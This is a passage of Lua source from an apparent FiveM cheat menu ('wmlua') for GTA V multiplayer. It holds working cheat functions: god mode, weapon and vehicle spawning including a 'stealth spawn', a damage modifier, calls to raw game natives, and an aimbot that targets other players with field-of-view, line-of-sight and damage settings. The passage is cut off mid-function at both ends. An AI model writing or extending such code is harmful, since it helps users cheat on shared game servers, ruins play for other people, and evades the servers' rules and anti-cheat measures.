            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 30, 100)
        end

        if wmlua.F.HoldingCTRL(0, 174) and wmlua.F.HoldingCTRL(0, 172) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 7, 1)
        end

        if wmlua.F.HoldingCTRL(0, 175) and wmlua.F.HoldingCTRL(0, 172) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 8, 1)
        end

        if wmlua.F.HoldingCTRL(0, 174) and not wmlua.F.HoldingCTRL(0, 172) and not wmlua.F.HoldingCTRL(0, 173) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 4, 1)
        end

        if wmlua.F.HoldingCTRL(0, 175) and not wmlua.F.HoldingCTRL(0, 172) and not wmlua.F.HoldingCTRL(0, 173) then
            wmlua.N.TaskVehicleTempAction(wmlua.P.RCCar.Driver, wmlua.P.RCCar.Entity, 5, 1)
        end

    end

    wmlua.P.RCCar.DrawInstructions = function(distanceCheck)
        local steeringButtons = {
            {
                ["label"] = "Right",
                ["button"] = "~INPUT_CELLPHONE_RIGHT~"
            },
            {
                ["label"] = "Forward",
                ["button"] = "~INPUT_CELLPHONE_UP~"
            },
            {
                ["label"] = "Reverse",
                ["button"] = "~INPUT_CELLPHONE_DOWN~"
            },
            {
                ["label"] = "Left",
                ["button"] = "~INPUT_CELLPHONE_LEFT~"
            }
        }

        local pickupButton = {
            ["label"] = "Pick Up",
            ["button"] = "~INPUT_CONTEXT~"
        }

        local buttonsToDraw = {
            {
                ["label"] = "Toggle Camera",
                ["button"] = "~INPUT_DETONATE~"
            }
        }

        for buttonIndex = 1, #steeringButtons do
            local steeringButton = steeringButtons[buttonIndex]

            wmlua.F.InsertToTable(buttonsToDraw, steeringButton)
        end

        if distanceCheck <= 1.5 then
            wmlua.F.InsertToTable(buttonsToDraw, pickupButton)
        end

        wmlua_Thread(function()
            local instructionScaleform = RequestScaleformMovie("instructional_buttons")

            while not HasScaleformMovieLoaded(instructionScaleform) do
                wmlua_Schleep(0)
            end

            PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
            PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()

            for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
                PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
                PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

                wmlua.H.WMInvokeNative(0xE83A3E3557A56640, buttonValues["button"])
                wmlua.H.WMInvokeNative(0xBA7148484BD90365, buttonValues["label"])
                wmlua.H.WMInvokeNative(0xC6796A8FFA375E53)
            end

            PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
        end)
    end

    wmlua.P.RCCar.Spawn = function()

        wmlua.V.RC_Carmodel = wmlua.F.GetInput("Enter Car Name (rcbandito or custom)")

        local spawnCoords, spawnHeading = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.N.GetEntityHeading(wmlua.N.GetPlayerPed())

        if wmlua.V.RC_preferfreecam and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active and wmlua.N.DoesCamExist(wmlua.V.Freecam) then
            scx,scy,scz = table.unpack(wmlua.V.CAM_hitcoords)
        else
            scx,scy,scz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, -12.0, 0.5))
        end

        wmlua.P.RCCar.Entity = wmlua.N.SpawnVeh(wmlua.N.GetHashKey(wmlua.V.RC_Carmodel), scx, scy, scz, spawnHeading, true)

        wmlua.P.RCCar.Blip = wmlua.N.AddBlipForEntity(wmlua.P.RCCar.Entity)

        wmlua.N.SetBlipSprite(wmlua.P.RCCar.Blip, 662)
        wmlua.N.SetBlipColor(wmlua.P.RCCar.Blip, 53)
        wmlua.N.SetBlipScale(wmlua.P.RCCar.Blip, 0.5)

        wmlua.F.RequestControl(wmlua.P.RCCar.Entity) -- We should have control but ooga booga, lets req incase if not due to how buggy fivem's sync system is.

        wmlua.N.SetEntityAsMissionEntity(wmlua.P.RCCar.Entity, 1,1)

        while not wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) do
            wmlua_Schleep(5)
        end

        wmlua.P.RCCar.Driver = wmlua.N.CreatePedInsideVehicle(wmlua.P.RCCar.Entity, 5, wmlua.N.GetHashKey("a_m_y_eastsa_01"), -1, true, true)

        wmlua.N.WadaGM(wmlua.P.RCCar.Driver, true, 16.1337)
        wmlua.N.SetPedAlertness(wmlua.P.RCCar.Driver, 0.0)

        wmlua.P.RCCar.Attach("place")
    end

    wmlua.P.RCCar.Attach = function(param)

        if not wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) then
            return
        end

        if param == "place" then

            wmlua.N.PlaceObjectOnGroundProperly(wmlua.P.RCCar.Entity)

        elseif param == "pick" then

            if wmlua.N.DoesCamExist(wmlua.P.RCCar.Camera) then
                wmlua.P.RCCar.ToggleCamera(false)
            end

            wmlua_Schleep(500)

            wmlua.N.DetachEntity(wmlua.P.RCCar.Entity)

            wmlua.N.DeleteVehicle(wmlua.P.RCCar.Entity)
            wmlua.N.DeleteEntity(wmlua.P.RCCar.Driver)

            wmlua.H.WMInvokeNative(0x198F77705FA0931D, wmlua.N.GetPlayerPed())
        
            wmlua.P.RCCar.Entity = nil
            wmlua.P.RCCar.Driver = nil
            
        end

    end

    wmlua.P.RCCar.ToggleCamera = function(boolean)

        if boolean then

            if not wmlua.N.DoesEntityExist(wmlua.P.RCCar.Entity) then return end
            if wmlua.N.DoesCamExist(wmlua.P.RCCar.Camera) then wmlua.N.DestroyCam(wmlua.P.RCCar.Camera) end

            wmlua.P.RCCar.Camera = wmlua.N.CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

            wmlua.N.AttachCamToEntity(wmlua.P.RCCar.Camera, wmlua.P.RCCar.Entity, 0.0, -10.0, 6.5, true)

            wmlua_Thread(function()
                while wmlua.N.DoesCamExist(wmlua.P.RCCar.Camera) do
                    wmlua_Schleep(5)
                    wmlua.V.RCCar_ROT = wmlua.N.GetEntityRotation(wmlua.P.RCCar.Entity)
                    cx,cy,cz = table.unpack(wmlua.V.RCCar_ROT)
                    cx = cx - 10.0
                    wmlua.N.SetCamRot(wmlua.P.RCCar.Camera, cx,cy,cz)
                end
            end)

            local easeTime = 5 * math.ceil(wmlua.N.GetDistanceBetweenCoords(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.N.GetEntityPos(wmlua.P.RCCar.Entity), true) / 10)

            wmlua.N.RenderCam(1, 1, easeTime, 1, 1)

            wmlua_Schleep(easeTime)

        else

            local easeTime = 5 * math.ceil(wmlua.N.GetDistanceBetweenCoords(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.N.GetEntityPos(wmlua.P.RCCar.Entity), true) / 10)

            wmlua.N.RenderCam(0, 1, easeTime, 1, 0)

            wmlua_Schleep(easeTime)

            wmlua.N.ClearTimecycleModifier()

            wmlua.N.DestroyCam(wmlua.P.RCCar.Camera)

        end
    end

    local isSkyfall = false

    function wmlua.F.SkyfallDo()
        if not isSkyfall then
            isSkyfall = true

            wmlua_Thread(function()

                local playerPed = wmlua.N.GetPlayerPed()
                local playerPos = wmlua.N.GetEntityPos(playerPed)

                wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(), wmlua.N.GetHashKey("gadget_parachute"), 1, true, true)

                wmlua.F.TeleportToCoords(playerPos.x, playerPos.y, playerPos.z + 500.0)

                wmlua_Schleep(2000)

                wmlua.F.EventLogInsert('[~b~WM~w~] Superman Activated', 2000)

                wmlua.N.WadaGM(wmlua.N.GetPlayerPed(), true, 16.1337)

                if not wmlua.V.SupermanSpeed then wmlua.V.SupermanSpeed = 300.0 end
                if not wmlua.V.SupermanSpeed2 then wmlua.V.SupermanSpeed2 = 300.0 end
                while true do
                    if isSkyfall then
                        if wmlua.N.IsPedInParachuteFreeFall(wmlua.N.GetPlayerPed()) and not wmlua.N.HasEntityCollidedWithAnything(wmlua.N.GetPlayerPed()) then
                            wmlua.menu.f.drawtext({text = '[~b~WM~w~] Superman Speed: ' .. wmlua.V.SupermanSpeed .. " | " .. wmlua.V.SupermanSpeed2, x = 0.45, y = 0.9, scale = 0.1, size = 0.35, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                            wmlua.H.WMInvokeNative(0xC5F68BE9613E2D18, wmlua.N.GetPlayerPed(), true, 0.0, wmlua.V.SupermanSpeed, 3.5, 0.0, 0.0, 0.0, false, true, false, false, false, true)
                            
                            if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 15) then
                                wmlua.V.SupermanSpeed2 = wmlua.V.SupermanSpeed2 + 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 14) then
                                wmlua.V.SupermanSpeed2 = wmlua.V.SupermanSpeed2 - 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.PressedCTRL(0, 15) then
                                wmlua.V.SupermanSpeed = wmlua.V.SupermanSpeed + 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.PressedCTRL(0, 14) then
                                wmlua.V.SupermanSpeed = wmlua.V.SupermanSpeed - 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            end
                    
                            if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 15) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                                wmlua.V.SupermanSpeed2 = wmlua.V.SupermanSpeed2 + 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 14) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                                wmlua.V.SupermanSpeed2 = wmlua.V.SupermanSpeed2 - 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.HoldingCTRL(0, 15) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                                wmlua.V.SupermanSpeed = wmlua.V.SupermanSpeed + 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            elseif wmlua.F.HoldingCTRL(0, 14) and wmlua.V.LastAct < wmlua.N.Get_GameTimer() - 125 then
                                wmlua.V.SupermanSpeed = wmlua.V.SupermanSpeed - 10.0
                                wmlua.V.LastAct = wmlua.N.Get_GameTimer()
                            end

                            if wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 213) then
                                wmlua.V.SupermanSpeed = tonumber(wmlua.F.GetInput("Enter Speed"))
                            end
                            
                            if wmlua.F.HoldingCTRL(0, 8) then
                                wmlua.H.WMInvokeNative(0xC5F68BE9613E2D18, wmlua.N.GetPlayerPed(), true, 0.0, wmlua.V.SupermanSpeed, wmlua.V.SupermanSpeed2, 0.0, 0.0, 0.0, false, true, false, false, false, true)
                            end
                        else
                            isSkyfall = false
                        end
                    else
                        break
                    end
                    wmlua_Schleep(0)
                end

                wmlua.N.RemovePedWeapon(playerPed, wmlua.N.GetHashKey("gadget_parachute"))

                wmlua_Schleep(3000)

                wmlua.N.WadaGM(wmlua.N.GetPlayerPed(), false, 16.1337)

            end)
        end
    end

    wmlua.T.AimbotBoneOpts = {wmlua.STRINGS[12], wmlua.STRINGS[13]}

    function wmlua.F.NameToBone(name)
        if name == wmlua.STRINGS[12] then
            return wmlua.STRINGS[10]
        elseif name == wmlua.STRINGS[13] then
            return wmlua.STRINGS[11]
        end
    end

    function wmlua.F.Round(num, numDecimalPlaces)
        if num == nil then
            return 0
        end
        if numDecimalPlaces == 0 then
            num = math.floor(num)
            return num
        else
            local mult = 10 ^ (numDecimalPlaces or 0)
            return math.floor(num * mult + 0.5) / mult
        end
    end

    wmlua.V.SelAimbotBone = 1

    function wmlua.F.CreateMapblip()

        local name = wmlua.F.GetInput("Enter Blip Name")
        local x = tonumber(wmlua.F.GetInput("Enter Blip X Coord"))
        local y = tonumber(wmlua.F.GetInput("Enter Blip Y Coord"))

        local blip = AddBlipForCoord(tonumber(x), tonumber(y), 0.0)

        wmlua.N.SetBlipSprite(blip, 161)
        wmlua.N.SetBlipDisplay(blip, 2)
        wmlua.N.SetBlipScale(blip, 0.8)
        wmlua.N.SetBlipColor(blip, 26)
        wmlua.N.SetBlipAsShortRange(blip, true)
        wmlua.H.WMInvokeNative(wmlua.STRINGS[29], wmlua.STRINGS[24])
        wmlua.N.AddTextComponentSubstringPlayerName(name)
        wmlua.H.WMInvokeNative(wmlua.STRINGS[57], blip)

    end

    -- Cheat Functions

    function wmlua.F.MaxVehUpgrade(veh)

        wmlua.N.SetVehicleModKit(veh, 0)
        for i = 11, 16 do
            wmlua.N.SetVehicleMod(veh, i, wmlua.N.GetNumVehicleMods(veh, i) - 1, false)
        end
        wmlua.N.ToggleVehicleMod(veh, 17, true)
        wmlua.N.ToggleVehicleMod(veh, 18, true)
        wmlua.N.ToggleVehicleMod(veh, 22, true)

    end

    function wmlua.F.VEHSpawn()

        wmlua_Thread(function()

            wmlua.V.vehname = wmlua.F.GetInput("Enter Vehicle Name")
            wmlua.V.vehspawn = wmlua.F.GetInput("Stealth Spawn (y/n)")
            wmlua.V.vehupgrade = wmlua.F.GetInput("Upgrade Vehicle? (y/n)")
            wmlua.V.vehcolorrgb1 = wmlua.F.Split(wmlua.F.GetInput("Color 1 RGB EX: 255,255,255"), ',')
            wmlua.V.vehcolorrgb2 = wmlua.F.Split(wmlua.F.GetInput("Color 2 RGB EX: 0,0,0"), ',')
            wmlua.V.vheading = wmlua.N.GetEntityHeading(wmlua.N.GetPlayerPed())

            if wmlua.V.vehname ~= wmlua.STRINGS[19] and wmlua.V.vehspawn ~= wmlua.STRINGS[19] and wmlua.V.vehupgrade ~= wmlua.STRINGS[19] and wmlua.V.vehcolorrgb1 ~= wmlua.STRINGS[19] and wmlua.V.vehcolorrgb2 ~= wmlua.STRINGS[19] and wmlua.V.vheading ~= wmlua.STRINGS[19] then

                if wmlua.V.vehspawn == "y" then

                    math.randomseed(1337 + wmlua.N.Get_GameTimer())

                    wmlua.T.VOffsets = {
                        {x = math.random(100, 200), y = math.random(100, 200)},
                        {x = math.random(-200, -100), y = math.random(-200, -100)},
                        {x = math.random(100, 200), y = math.random(-200, -100)},
                        {x = math.random(-200, 100), y = math.random(100, 200)}
                    }

                    wmlua.V.VOffsets = wmlua.T.VOffsets[math.random(1,4)]
                    wmlua.V.VOffsets.x = wmlua.V.VOffsets.x + 0.0001
                    wmlua.V.VOffsets.y = wmlua.V.VOffsets.y + 0.0001
                    wmlua.V.vx,wmlua.V.vy,wmlua.V.vz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), wmlua.V.VOffsets.x, wmlua.V.VOffsets.y, 0.5))
                    _,wmlua.V.pos = GetClosestVehicleNode(wmlua.V.vx, wmlua.V.vy, wmlua.V.vz, 1, 0)
                    wmlua.F.EventLogInsert('[~b~WM~w~] Vehicle spawned, waypoint set', 3000)

                elseif wmlua.V.vehspawn == "n" then

                    wmlua.V.pos = wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.N.GetPlayerPed(), 0.0, 8.0, 0.5)
                    wmlua.F.EventLogInsert('[~b~WM~w~] Vehicle spawned infront.', 3000)

                end

                wmlua_Thread(function()

                    wmlua.V.veh = wmlua.V.vehname
                    if wmlua.V.veh == nil or wmlua.V.veh == wmlua.STRINGS[19] then wmlua.V.veh = "ruiner" end
                    wmlua.V.vehiclehash = wmlua.N.GetHashKey(wmlua.V.veh)

                    wmlua.V.spveh = wmlua.N.SpawnVeh(wmlua.V.vehiclehash, wmlua.V.pos, wmlua.V.vheading, 1, 0)
                    wmlua.N.SetVehicleExtraColours(wmlua.V.spveh, 0, 0)
                    wmlua.N.SetVehicleCustomPrimaryColour(wmlua.V.spveh, tonumber(wmlua.V.vehcolorrgb1[1]), tonumber(wmlua.V.vehcolorrgb1[2]), tonumber(wmlua.V.vehcolorrgb1[3]))
                    wmlua.N.SetVehicleCustomSecondaryColour(wmlua.V.spveh, tonumber(wmlua.V.vehcolorrgb2[1]), tonumber(wmlua.V.vehcolorrgb2[2]), tonumber(wmlua.V.vehcolorrgb2[3]))

                    if string.lower(wmlua.V.vehupgrade) == "y" then
                        wmlua.F.MaxVehUpgrade(wmlua.V.spveh)
                    end

                    wmlua.N.SetNewWaypoint(wmlua.V.pos)

                end)

            end

        end)

    end

    function wmlua.F.VEHUpgrade()

        wmlua.F.MaxVehUpgrade(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()))

    end

    function wmlua.F.VEHRespray()

        wmlua.V.clr_main = wmlua.F.Split(wmlua.F.GetInput("Enter Main Color in RGB Format EX: 255,0,0"), ',')
        wmlua.V.clr_secondary = wmlua.F.Split(wmlua.F.GetInput("Enter Secondary Color in RGB Format EX: 255,255,255"), ',')

        wmlua.V.PVeh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
        wmlua.F.RequestControl(wmlua.V.PVeh) --[[ This be for if you are out of the vehicle and ***somehow*** control was lost.]]
        wmlua.N.SetVehicleExtraColours(wmlua.V.PVeh, 0, 0)

        wmlua.N.SetVehicleCustomPrimaryColour(wmlua.V.PVeh, tonumber(wmlua.V.clr_main[1]), tonumber(wmlua.V.clr_main[2]), tonumber(wmlua.V.clr_main[3]))
        wmlua.N.SetVehicleCustomSecondaryColour(wmlua.V.PVeh, tonumber(wmlua.V.clr_secondary[1]), tonumber(wmlua.V.clr_secondary[2]), tonumber(wmlua.V.clr_secondary[3]))

    end

    function wmlua.F.VEHGodmode()

        wmlua.F.CFS("wmlua.V.Veh_godmode")

    end

    function wmlua.F.VEHBulletProofTires()

        wmlua.F.CFS("wmlua.V.Veh_bulletprooftires")

        if not wmlua.V.Veh_bulletprooftires then
            wmlua.N.SetCanTiresPop(wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), true)
        end

    end

    function wmlua.F.VEHRefillBoost()

        if wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) then
            wmlua.V._veh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
            wmlua.F.RequestControl(wmlua.V._veh)
            wmlua.H.WMInvokeNative(0xFEB2DDED3509562E, wmlua.V._veh, 100.0)
            wmlua.F.EventLogInsert('[~b~WM~w~] Refilled Boost', 750)
        end

    end

    function wmlua.F.VEHFix()

        wmlua.V._veh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
        wmlua.F.RequestControl(wmlua.V._veh)
        wmlua.N.SetVehicleEngineHealth(wmlua.V._veh, 1000.0)
        wmlua.N.SetVehicleFixed(wmlua.V._veh)
        wmlua.N.SetVehicleDeformationFixed(wmlua.V._veh)
        wmlua.N.SetVehicleUndriveable(wmlua.V._veh, false)

    end

    function wmlua.F.VEHFixEngine()

        wmlua.V._veh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
        wmlua.F.RequestControl(wmlua.V._veh)
        wmlua.N.SetVehicleEngineHealth(wmlua.V._veh, 1000.0)
        wmlua.N.SetVehiclePetrolTankHealth(wmlua.V._veh, 1000.0)
        wmlua.N.SetVehicleUndriveable(wmlua.V._veh, false)

    end

    function wmlua.F.VEHClean()

        wmlua.V._veh = wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true)
        wmlua.F.RequestControl(wmlua.V._veh)
        wmlua.N.SetVehicleDirtLevel(wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), true), 0.0)

    end

    function wmlua.F.WEPSpawnWep()

        wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
        wmlua.V.name = string.lower(wmlua.V.name)
        wmlua.V.ammo = tonumber(wmlua.F.GetInput("Enter Ammo Count"))
        if not wmlua.V.ammo then wmlua.V.ammo = 150 end

        if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') and not string.find(wmlua.V.name, 'parachute') then
            wmlua.V.name = 'weapon_' .. wmlua.V.name
        end
        if string.find(wmlua.V.name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
            wmlua.V.name = 'gadget_' .. wmlua.V.name
        end

        wmlua.F.EventLogInsert(wmlua.V.name)

        wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(), wmlua.N.GetHashKey(wmlua.V.name), wmlua.V.ammo, false, false)

        wmlua.F.EventLogInsert("[~b~WM~w~] Spawned " .. wmlua.V.name .. " (" .. wmlua.V.ammo .. ")", 3000)

    end

    function wmlua.F.WEPRemoveWep()

        wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
        wmlua.V.name = string.lower(wmlua.V.name)

        if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') and not string.find(wmlua.V.name, 'parachute') then
            wmlua.V.name = 'weapon_' .. wmlua.V.name
        elseif string.find(name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
            wmlua.V.name = 'gadget_' .. wmlua.V.name
        end

        wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(), wmlua.N.GetHashKey(wmlua.V.name))

    end

    function wmlua.F.WEPSpawnAllWeps()
        wmlua_Thread(function()
            for k,v in ipairs(wmlua.T.Weapons) do
                wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(), v.hash, 5000, false, false)
                wmlua_Schleep(10)
            end
        end)
    end

    function wmlua.F.WEPRemoveAllWeps()
        wmlua_Thread(function()
            for k,v in ipairs(wmlua.T.Weapons) do
                if v.hash ~= wmlua.N.GetHashKey("weapon_unarmed") then
                    wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(), v.hash)
                    wmlua_Schleep(10)
                end
            end
        end)
    end

    function wmlua.F.WEPDamageModifier()

        wmlua.V.dmginput = wmlua.F.GetInput("Enter desired damage modifier")
        wmlua.V.dmginput = tonumber(wmlua.V.dmginput)
        if type(wmlua.V.dmginput) == wmlua.STRINGS[53] then
            wmlua.V.dmginput = wmlua.V.dmginput + 0.00000001
        end

        wmlua.V.Wep_dmgmod_val = wmlua.V.dmginput
        wmlua.F.CFT("wmlua.V.Wep_dmgmod", "Damage Modifier " .. wmlua.F.Round(wmlua.V.Wep_dmgmod_val, 0))

    end

    function wmlua.F.AimToggle()

        wmlua.F.CFS("wmlua.V.Aim_tog")

    end

    function wmlua.F.AimDrawFov()

        wmlua.F.CFS("wmlua.V.Aim_drawfov")

    end


    function wmlua.F.AimDistance()

        wmlua.V.inp = wmlua.F.GetInput("Aim Distance in Meters")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_distance = wmlua.F.ClampInt(tonumber(wmlua.V.inp), 0, 10 * 1000)
            wmlua.F.CFT("wmlua.V.Aim_distance", "Aim Distance " .. wmlua.V.Aim_distance)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AimDamage()

        wmlua.V.inp = wmlua.F.GetInput("Aim Damage per Hit")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_damage = wmlua.F.ClampInt(tonumber(wmlua.V.inp), 0, 9999999999)
            if wmlua.V.Aim_damage ~= 0 then
                wmlua.F.CFT("wmlua.V.Aim_damage", "Aim Damage " .. wmlua.V.inp)
            else
                wmlua.F.CFT("wmlua.V.Aim_damage", "Aim Damage Default")
            end
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AimVisCheck()

        wmlua.F.CFS("wmlua.V.Aim_vischeck")

    end

    wmlua.V.SelPed = 0


    function wmlua.F.TList()

        wmlua.T.PossibleTargets = {}

        local pList = wmlua.N.GetEntList("CPed")
        for i = 1, #pList do
            if not wmlua.T.TableContains(wmlua.T.peds, pList[i]) then
                wmlua.F.InsertToTable(wmlua.T.peds, pList[i])
            end
        end
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_target_player"]].active then
            for i, v in ipairs(wmlua.Playerlist_Closest_Players) do
                if not v.friend and v.ped ~= wmlua.N.GetPlayerPed() then
                    wmlua.F.InsertToTable(wmlua.T.PossibleTargets, v.ped)
                else
                end
            end
        end
        for i = 1, #wmlua.T.peds do

            wmlua.V.ignore = false

            if wmlua.T.peds[i] == wmlua.N.GetPlayerPed() then
                wmlua.V.ignore = true
            end

            for _i, _v in ipairs(wmlua.Playerlist_Players) do
                if _v.ped == wmlua.T.peds[i] and _v.friend == true then
                    wmlua.V.ignore = true
                end
            end

            if not wmlua.V.ignore then
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_target_npc"]].active and wmlua.N.IsPedHuman(wmlua.T.peds[i]) and not wmlua.N.IsPedAPlayer(wmlua.T.peds[i]) then
                    wmlua.F.InsertToTable(wmlua.T.PossibleTargets, wmlua.T.peds[i])
                end
                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_target_animal"]].active and not wmlua.N.IsPedHuman(wmlua.T.peds[i]) then
                    wmlua.F.InsertToTable(wmlua.T.PossibleTargets, wmlua.T.peds[i])
                end
            end
        end

    end

    wmlua.V.ShotsFired = 0
    wmlua.V.Aim_actchance = 100
    wmlua.V.Aim_actafter = 0
    wmlua.V.Aim_stopafter = 0
    wmlua.V.Aim_fovoffset = 0.0

    function wmlua.F.aim_setfov()
        local fov = math.abs(tonumber(wmlua.F.GetInput("Enter FOV")))
        if type(fov) == "number" then
            fov = fov + .0
            wmlua.T.aimfov.selectedfov = fov
            wmlua.F.aim_buildFOV()
            wmlua.F.EventLogInsert('[~b~' .. identity.short .. '~s~] Set FOV to ' .. wmlua.T.aimfov.selectedfov)
        else
            wmlua.F.EventLogInsert('[~r~' .. identity.short .. '~s~] Invalid Input')
        end
    end
    
    wmlua.T.aimfov = {}
    wmlua.T.aimfov.selectedfov = 60.0

    function wmlua.F.aim_buildFOV()
        local sw, sh = wmlua.N.GetResolution()
        wmlua.T.aimfov.points = {}
        for i = 1, 360 do
            local x = math.cos(math.rad(i)) / sw
            local y = math.sin(math.rad(i)) / sh
            local sx, sy = x * wmlua.T.aimfov.selectedfov, y * wmlua.T.aimfov.selectedfov
            wmlua.T.aimfov.points[#wmlua.T.aimfov.points + 1] = {
                x = sx + ((sw / 2) / sw),
                y = sy + ((sh / 2) / sh)
            }
        end
    end
    
    function wmlua.F.aim_inFOV(fx,fy)
        local conditions = {
            gx = false,
            gy = false,
            lx = false,
            ly = false
        }
        for i = 1, #wmlua.T.aimfov.points do
            if i <= 180 then l = 180 else l = i - 180 end
            if wmlua.T.aimfov.points[i + l] ~= nil then
                if wmlua.T.aimfov.points[i].x < fx and wmlua.T.aimfov.points[l].x > fx then 
                    conditions.gx = true
                    conditions.lx = true
                else
                    conditions.gx = false
                    conditions.lx = false
                end
                if wmlua.T.aimfov.points[i].y < fy and wmlua.T.aimfov.points[l].y > fy then 
                    conditions.gy = true
                    conditions.ly = true
                else
                    conditions.gy = false
                    conditions.ly = false
                end
                if conditions.gx and conditions.gy and conditions.lx and conditions.ly then return true end
            end
        end
        return false
    end
    
    function wmlua.F.aim_drawFOV()
        local leOffset = 0.000875 * wmlua.T.aimfov.selectedfov
        local diff = wmlua.T.aimfov.points[1].x - wmlua.T.aimfov.points[180].x
        wmlua.N.DrawSprite('mpmissmarkers256','corona_shade', 0.5  --[[x]], 0.5 --[[y]], diff, diff + leOffset, 0.0, 0, 0, 0, 80)
    end

    function wmlua.F.aimwmbot()

        wmlua.V.Aim_newtarget = false
        wmlua.V.Aim_Act = false
        wmlua.V.Aim_AA = false
        wmlua.V.Aim_SA = false

        if wmlua.V.Aim_actafter == 0 then
            wmlua.V.Aim_AA = true
        end

        if wmlua.V.Aim_stopafter == 0 then
            wmlua.V.Aim_SA = true
        end

        if wmlua.V.ShotsFired >= wmlua.V.Aim_actafter then
            wmlua.V.Aim_AA = true
        end

        if wmlua.V.ShotsFired < wmlua.V.Aim_stopafter then
            wmlua.V.Aim_SA = true
        end

        if wmlua.V.Aim_AA and wmlua.V.Aim_SA then
            wmlua.V.Aim_Act = true
        end

        if wmlua.V.Aim_control == nil then
            wmlua.V.Aim_control = 21
        end

        if wmlua.F.HoldingCTRL(0, tonumber(wmlua.V.Aim_control)) and wmlua.V.Aim_Act then

            if wmlua.T.PossibleTargets then
                for i = 1, #wmlua.T.PossibleTargets do
                    
                    local aimHitbox = 0
                    if wmlua.N.CompareDistance(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()), wmlua.N.GetEntityPos(wmlua.T.PossibleTargets[i])) < wmlua.V.Aim_distance then
                        aimHitbox = 31086

                        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_vischeck"]].active then
                            wmlua.V.cansee = wmlua.N.HasEntityClearLosToEntity(wmlua.N.GetPlayerPed(), wmlua.T.PossibleTargets[i], 17)
                        else
